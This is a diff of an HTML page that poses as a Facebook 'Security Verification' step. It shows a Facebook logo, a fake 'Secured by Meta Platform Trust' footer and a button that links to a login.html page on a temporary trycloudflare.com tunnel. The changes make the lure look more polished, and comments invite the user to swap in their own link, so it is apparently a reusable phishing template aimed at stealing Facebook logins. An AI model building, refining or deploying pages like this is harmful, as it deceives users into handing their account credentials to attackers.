@@ -1,59 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Security Page</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Security Verification</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f7f9fc;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #eef1f5;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
 
     .security-container {
-      background: white;
-      padding: 40px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      background: #ffffff;
+      padding: 40px 50px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+      max-width: 420px;
+      width: 90%;
       text-align: center;
     }
 
-    .security-container h1 {
-      color: royalblue;
+    .logo {
       margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 80px;
+      height: auto;
+    }
+
+    .lock-icon {
+      font-size: 24px;
+      color: #2c7be5;
+      margin-bottom: 10px;
+    }
+
+    .security-container h1 {
+      color: #2c3e50;
+      margin-bottom: 16px;
+      font-size: 22px;
+    }
+
+    .info {
+      font-size: 15px;
+      color: #4a4a4a;
+      margin-bottom: 24px;
     }
 
     .secure-link {
       display: inline-block;
-      margin-top: 20px;
       padding: 12px 25px;
-      background-color: royalblue;
+      background-color: #2c7be5;
       color: white;
+      font-weight: bold;
       text-decoration: none;
-      border-radius: 8px;
+      border-radius: 6px;
       transition: background-color 0.3s ease;
     }
 
     .secure-link:hover {
-      background-color: #0a3d91;
+      background-color: #1a5bb8;
     }
 
-    .info {
-      font-size: 14px;
-      color: #555;
+    .footer-note {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #a0a0a0;
     }
   </style>
 </head>
 <body>
 
   <div class="security-container">
+    
+    <!-- Optional logo area -->
+    <div class="logo">
+      <!-- Replace with your preferred logo -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo" />
+    </div>
+
+    <div class="lock-icon"></div>
     <h1>Security Verification</h1>
-    <p class="info">For your protection, please use the link below to complete the verification process.</p>
-    <a class="secure-link" href="https://hungary-distances-modern-tourist.trycloudflare.com " target="_blank">Proceed to Facebook Login</a>
+
+    <p class="info">
+      For your protection, please verify your identity to continue.  
+      Click the button below to proceed.
+    </p>
+
+    <!-- Replace the href link with your own -->
+    <a class="secure-link" href="https://license-trinity-disappointed-isaac.trycloudflare.com/login.html" target="_blank">
+      Continue to Facebook
+    </a>
+
+    <p class="footer-note">Secured by Meta Platform Trust © 2025</p>
   </div>
 
 </body>
